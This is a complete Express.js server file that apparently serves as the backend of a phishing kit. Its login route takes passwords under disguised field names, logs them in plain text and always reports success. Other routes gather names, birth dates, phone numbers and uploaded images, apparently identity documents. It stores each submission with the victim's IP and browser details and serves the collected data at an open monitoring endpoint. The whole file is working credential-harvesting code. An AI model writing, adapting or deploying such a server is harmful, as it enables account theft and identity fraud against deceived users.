const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Accept only image files
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Data storage (in production, use a database)
let collectedData = [];

// Routes
app.post('/api/login', (req, res) => {
  const { xusr, xpss } = req.body;
  
  console.log('Login attempt:', { xusr, xpss });
  
  // Store login data
  collectedData.push({
    type: 'login',
    data: { xusr, xpss },
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  res.json({ success: true, message: 'Login successful' });
});

app.post('/api/info', (req, res) => {
  const { xname1, xname2, xdob, xtel } = req.body;
  
  console.log('Info submission:', { xname1, xname2, xdob, xtel });
  
  // Store info data
  collectedData.push({
    type: 'info',
    data: { xname1, xname2, xdob, xtel },
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  res.json({ success: true, message: 'Info submitted successfully' });
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  const file = req.file;
  const formData = req.body;
  
  console.log('File upload request received');
  console.log('File object:', file);
  console.log('Form data:', formData);
  console.log('Request headers:', req.headers);
  
  console.log('File upload:', {
    filename: file ? file.filename : 'No file',
    originalName: file ? file.originalname : 'No file',
    size: file ? file.size : 0,
    formData
  });
  
  // Store upload data
  collectedData.push({
    type: 'upload',
    data: {
      filename: file ? file.filename : null,
      originalName: file ? file.originalname : null,
      size: file ? file.size : 0,
      ...formData
    },
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  res.json({ success: true, message: 'File uploaded successfully' });
});

app.post('/api/final', (req, res) => {
  const data = req.body;
  
  console.log('Final data submission:', data);
  
  // Store final data
  collectedData.push({
    type: 'final',
    data: data,
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  // Save all collected data to file
  const dataFile = path.join(__dirname, 'collected_data.json');
  fs.writeFileSync(dataFile, JSON.stringify(collectedData, null, 2));
  
  res.json({ success: true, message: 'Data submitted successfully' });
});

// Get collected data (for monitoring)
app.get('/api/data', (req, res) => {
  res.json(collectedData);
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Error:', error);
  res.status(500).json({ error: error.message });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
});
